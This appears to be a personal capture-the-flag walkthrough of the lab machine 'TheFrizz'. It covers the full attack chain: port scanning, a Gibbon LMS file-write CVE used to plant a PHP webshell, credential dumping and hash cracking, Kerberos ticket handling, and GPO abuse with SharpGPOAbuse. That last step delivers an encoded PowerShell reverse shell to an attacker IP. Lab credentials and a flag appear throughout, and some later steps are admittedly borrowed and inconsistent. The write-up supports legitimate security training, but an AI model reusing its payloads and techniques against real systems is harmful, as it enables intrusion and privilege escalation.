# TheFrizz Walkthrough

## Recon

### Initial Scanning

I use nmap to scan open TCP ports

nmap -p- --min-rate 10000 10.129.232.168 

PORT      STATE SERVICE  
22/tcp    open  ssh  
53/tcp    open  domain  
80/tcp    open  http  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
9389/tcp  open  adws  
49664/tcp open  unknown  
49667/tcp open  unknown  
49670/tcp open  unknown  
54240/tcp open  unknown  
57087/tcp open  unknown  
57091/tcp open  unknown  

Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds  

nmap -sCV -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 10.129.232.168 -Pn

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)  
53/tcp   open  domain        Simple DNS Plus   
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)  
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/  
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-05 07:27:14Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb, Site: Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
9389/tcp open  mc-nmf        .NET Message Framing  
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows  

We have port 22 SSH for a Window machine => check for a shell

We also port 53 dns, Kerberos port 88, ldap port 389, 3268 sugessting a domain controller

And the webserver is redirecting to frizzdc.frizz.htb. LDAP shows frizz.htb => I find subdomain


I generate netexec for hosts file 

netexec smb 10.129.232.168 --generate-hosts-file hosts 

cat hosts /etc/hosts | sudo sponge /etc/hosts

head -1 /etc/hosts  
10.129.232.168     frizzdc.frizz.htb frizz.htb frizzdc  

### Website port 80 TCP

The button for home and pricing are nothing interesting

The “Staff Login” button goes to /Gibbon-LMS/, which is the login page

The footer says Gibbon is version v25.0.00

### Directory Brute Force 

I will run feroxbuster against the website. Since it is Window and not case-sensitive, I am going to use lowercase worklist

feroxbuster -u http://frizzdc.frizz.htb --dont-extract-links -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

=> Nothing fun

### SMB port 45 tcp

I used netexec that show NTLM is disable

netexec smb 10.129.232.168                              
SMB         10.129.232.168  445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)  

Since NTLM is disabled, any attempt to authenticate with it returns STATUS_NOT_SUPPORTED

netexec smb 10.129.232.168 -u guest -p '' --shares  
SMB         10.129.232.168  445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None)   (NTLM:False)                                                                           
SMB         10.129.232.168  445    frizzdc          [-] frizz.htb\guest: STATUS_NOT_SUPPORTED   


I used -k to see any valid credentials:

netexec smb 10.129.232.168 -u guest -p '' -k        
SMB         10.129.232.168  445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)                                                                         
SMB         10.129.232.168  445    frizzdc          [-] frizz.htb\guest: KDC_ERR_CLIENT_REVOKED   

=> But nothing

### Shell as w.webservice

I search gibbon v25.0.00 cve => There are some vulnerabilities including Local File Inclusion LFI and XSS to look. There are RCE with CVE-2023-45878.

There is a PHP page in the Rubrics module, rubrics_visualise_saveAjax.php that can be accessed by unauthenticated users.

For the img parameter, it is expecting something similar to the data URI scheme, but this one includes a name as well:  

[mime type];[name],[base64 encoded image]  
image/png;asdf,iVBORw0KGgoAAAANSUhEUgAAA...  

Let's try some file write POC

curl -v http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php

Let's create some base64-encoded data

Now I will do POST in the format described above, including a gibbonPersonID

curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php -d 'img=image;ad,YWQgIHdhcyBoZXJlIQo=&path=poc.php&gibbonPersonID=0000000001'
poc.php 

And it was working

curl http://frizzdc.frizz.htb/Gibbon-LMS/poc.php  
ad  was here!  

Now let's have some payload with base64 encoded

echo '<?php system($_GET["cmd"]); ?>' | base64

I’ve added some spaces to get rid of any characters that might require encoding. Now I’ll upload this, updating the path and img parameters:

curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php -d 'img=image/png;ad,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyAgPz4K&path=ad.php&gibbonPersonID=0000000001'

curl http://frizzdc.frizz.htb/Gibbon-LMS/ad.php?cmd=whoami

=> It showed the web service

I’ll grab this github(https://github.com/davidzzo23/CVE-2023-45878), and paste the result into the webshell:


Here is the cmd python3 CVE-2023-45878.py -t TARGET_IP -s -i ATTACK_IP -p 1234

Don't forget nc -lvnp 1234

Then I execute the cmd. For reason the PS not spawing I just click enter in nc -lvnp 1234
listening on [any] 1234 ...

Then It showed PS C:\xampp\htdocs\Gibbon-LMS>

I do follow steps  
PS C:\xampp\htdocs\Gibbon-LMS> set username  
PS C:\xampp\htdocs\Gibbon-LMS> whoami  
frizz\w.webservice  

PS C:\xampp\htdocs\Gibbon-LMS> type config.php

And there is database connection info  
$databaseServer = 'localhost';   
$databaseUsername = 'MrGibbonsDB';  
$databasePassword = 'MisterGibbs!Parrot!?1';  
$databaseName = 'gibbon';  
  
In C:\xampp\mysql\bin there’s a mysql.exe file.

Then I log in to see mysql table   
PS C:\xampp\htdocs\Gibbon-LMS> \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;"  
Database  
gibbon  
information_schema  
test  

Nothing show on test table \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" test -e "SHOW TABLES;"

Now i tried gibbon table 

\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "SHOW TABLES;" => I have a tons of column

\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "describe gibbonperson;"   
=> describe gibbonperson;: This specific query returns the structure (schema) of the gibbonperson table, showing its columns, data types, and primary keys

I grab the username, passwordStrong, and passwordStrongSalt fields:

PS C:\xampp\mysql> \xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "select username,passwordStrong,passwordStrongSalt from gibbonperson;"  
username        passwordStrong  passwordStrongSalt  
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489  

### Crack the Hash

I used hashes.com to check hash type

Possible identifications: Decrypt Hashes  
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 - Possible algorithms: SHA256  

The hash is 64 hex characters, which is likely salted SHA256
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03/aACFhikmNopqrRTVz2489 - Possible algorithms: Base64(unhex(SHA-512($plaintext))) 

hashcat can take this in the format <hash>:<salt>

$ cat f.frizzle.hash 
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03/aACFhikmNopqrRTVz2489

. in PHP is used to concatenate strings. So it’s hashing Hashcat mode: 1420 → sha256($salt.$pass)

hashcat f.frizzle.hash rockyou.txt -a 0 -m 1420

Here is the hash 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23

I tried netexec to see if it is valid cred before i go to evil-winrm

netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23'  
SMB         10.129.232.168  445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB         10.129.232.168  445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED  

=> Not working

Let's try -k => error on clock skew

netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k  
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None) (NTLM:False)  
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\f.frizzle:Jenni_Luvs_Magic23 KRB_AP_ERR_SKEW  

sudo ntpdate frizzdc.frizz.htb
2026-02-05 04:11:42.210380 (-0500) +25200.473733 +/- 0.016781 frizzdc.frizz.htb 10.129.232.168 s1 no-leap  
CLOCK: time stepped by 25200.473733  
=> sudo ntpdate frizzdc.frizz.htb is done to synchronize your attacking machine's system time with the Domain Controller (frizzdc.frizz.htb). 

=> Why we do ntpdate Kerberos Authentication Requirement: The target utilizes Kerberos authentication for SSH/SMB, which requires the time difference between the client (you) and the domain controller to be within a very small threshold (usually 5 minutes).

Let is try again

Make sure 
Run “timedatectl set-ntp off” to disable the Network Time Protocol from auto-updating
Run “rdate -n [IP of Target]” to match your date and time with the date and time of the your target machine

netexec smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k 

Kerberos is sensitive and took me a lot of time to figure out

impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip 10.129.232.168

export KRB5CCNAME=f.frizzle.ccache

klist => (if klist is not available, sudo apt install krb5-user then prompt just enter blank ) then go to sudo nano /etc/krb5.conf 

[libdefaults]  
    default_realm = FRIZZ.HTB  
    dns_lookup_realm = false  
    dns_lookup_kdc = true  
    ticket_lifetime = 24h  
    forwardable = true  
     
[realms]  
FRIZZ.HTB = {  
    kdc = frizzdc.frizz.htb  
    admin_server = frizzdc.frizz.htb  
}  

[domain_realm]  
.frizz.htb = FRIZZ.HTB  
frizz.htb = FRIZZ.HTB  

Then we ssh in ssh f.frizzle@frizz.htb -K

### User flag
PS C:\Users\f.frizzle\Desktop> cat .\user.txt
d32f13919d8a6b32f8fe3e358d96e247

### Shell as m.schoolbus  
Then I do PS C:\Users> tree . /f to see list of directories

Their home directory is empty apart from the flag. There are two other potentially interesting users, m.schoolbus and v.frizzle

I’ll check the Program Files and Program Files (x86) directories for installed programs. Neither have much of interest:

### Recycle  Bin
User’s recycle bins are stored in C:\$RECYCLE.BIN by their SID. There’s one recycle bin on TheFrizz, and it’s a hidden directory:

 S-1-5-21-2386970044-1145388522-2932701813-1103


Note that without single quotes around $RECYCLE.BIN it will evaluate as an empty environment variable and cd will go to the user’s home directory.

There is one file pair in PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> ls

Diving into the metadata file isn’t necessary to solve TheFrizz, but it’s interesting. While the metadata file has the extension of the original file, it is not that format. The structure of the $I file for Windows 10 and later is:

Offset	Size	Data	Description
0	8	 	Header
8	8	Little-Endian Int	File Size
16	8	Windows FILETIME	Deletion Timestamp
24	4	Little-Endian Int	File Name Length
28	variable	UTF-16 String	File Name


NOw Let's hex dump in PowerShell:

format-hex '.\$IE2XMEG.7z'

I can load the file and parse it:

PS C:\>  $bytes = [System.IO.File]::ReadAllBytes('C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$IE2XMEG.7z')  
PS C:\> [BitConverter]::ToInt64($bytes, 8)  
30416987  
PS C:\> [datetime]::FromFileTimeUtc([BitConverter]::ToInt64($bytes, 16))  

Tuesday, October 29, 2024 2:31:09 PM  

PS C:\> [BitConverter]::ToInt32($bytes, 24)                               
60  
PS C:\> [System.Text.Encoding]::Unicode.GetString($bytes, 28, 120)  
C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z  


Now i use scp to copy the file

kali@kali scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z

* Note kerberos is time sentive ticket so might not able copy from target machine to attacker machine what i did is redo

impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip 10.129.232.168  
export KRB5CCNAME=f.frizzle.ccache  
klist

We have to file wapt-backup-sunday.7z  

file wapt-backup-sunday.7z   
wapt-backup-sunday.7z: 7-zip archive data, version 0.4  


Then let's unzip  
7z x wapt-backup-sunday.7z  

There are a bunch of certificates and keys, but none that are useful for anything. wapt/conf/ has some of these, as well as waptserver.ini

ls wapt/conf

┌──(kali㉿kali)-[~/htb/TheFrizz/wapt/conf]  
└─$ cat waptserver.ini   

There is some:  
secret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ  
server_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38  
token_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD  
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=

The secret_key decodes to something with a lot of non-ASCII characters in it: 

echo "ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ" | base64 -d | xxd

The wapt_password on the other hand gives a text password:
┌──(kali㉿kali)-[~/htb/TheFrizz/wapt/conf]  
└─$ echo IXN1QmNpZ0BNZWhUZWQhUgo= | base64 -d  
!suBcig@MehTed!R  

### SSH
Let is try username m.schoolbust with netexec (The error time skew kept messing me up So then sudo rdate -n 10.129.232.168 and follow trouble step above )

netexec smb frizzdc.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k  
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:None)   (NTLM:False)                                                                       
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\m.schoolbus:!suBcig@MehTed!R  

netexec ssh frizzdc.frizz.htb -u m.schoolbus -p '!suBcig@MehTed!R' -k  
SSH         frizzdc.frizz.htb 22     frizzdc.frizz.htb [*] SSH-2.0-OpenSSH_for_Windows_9.5  

It doesn’t work for SSH because netexec does not yet support Kerberos auth for SSH 

The kinit command in Linux/Unix systems obtains and caches an initial Kerberos ticket-granting ticket (TGT).

kinit m.schoolbus
Password for m.schoolbus@FRIZZ.HTB:  (Type password obtained above in here)

Then ssh -k m.schoolbus@frizzdc.frizz.htb

PS C:\Users\M.SchoolBus> whoami
frizz\m.schoolbus

### Shell as nt authority\system  

Looking at the m.schoolbus user, the thing that jumps out is membership in an interesting group:  
PS C:\Users\M.SchoolBus> net user m.schoolbus

This group is a member of the “Group Policy Creator Owners” group:

Let's do whoami /groups

### GPO

While “Group Policy Creator Owners” is not a default group, it strongly suggests that m.schoolbus is able to read and write Group Policy Objects.

SharpGPOAbuse is a project for attacking GPOs with capabilities to modify users, add local admins, set startup scripts, run commands, etc.


SharpGPOAbuse.exe requires a “vulnerable” (writable) GPO. There are two GPOs on the domain: by doing Get-GPO -all

I do 
New-GPO -name "ad"

Then New-GPLink -Name "ad" -target "DC=frizz,DC=htb"
GpoId       : 5e0f046b-8b3b-4d0e-9ffc-743a72f8b90b  
DisplayName : ad  
Enabled     : True  
Enforced    : False  
Target      : DC=frizz,DC=htb  
Order       : 2  

I’ll use SharpGPOAbuse.exe to execute a command:  
\windows\temp\SharpGPOAbuse.exe --addcomputertask --GPOName "ad" --Author "ad" --TaskName "RevShell" --Command "powershell.exe" --Arguments "whoami > \users\m.schoolbus\test"

This will run whoami and pipe the results into C:\Users\m.schoolbus. Just after running this, that file doesn’t exist:

gpupdate /force will propagate the GPO:

gpupdate /force

PS C:\Users\M.SchoolBus> cat \users\m.schoolbus\test
nt authority\system

It’s best to work off a clean GPO for another command

For simplicity, I create a new one and link it:

New-GPO -name "ad-rev"  
New-GPLink -Name "ad-rev" -target "DC=frizz,DC=htb"  

Now I’ll set the command as a PowerShell reverse shell and update it:

For some reason, the SharpGPOAbuse.exe is not in so i do scp  SharpGPOAbuse.exe m.schoolbus@frizz.htb:/Users/M.SchoolBus

New-GPO -Name "ad1" 
New-GPLink -Target "OU=Domain Controllers,DC=frizz,DC=htb" -Name "ad1"
gpupdate /force

\windows\temp\SharpGPOAbuse.exe --addcomputertask --GPOName "0xdf-rev" --Author "0xdf" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

gpupdate /force

-> After this part, I got log out mschoolbus and cant log back in. I had a hint from people. Here is the rest
When that completes, there’s a reverse shell at my listening nc with rlwrap -cAr nc -lnvp 443

PS C:\Windows\system32> whoami
nt authority\system


PS C:\users\administrator\desktop> type root.txt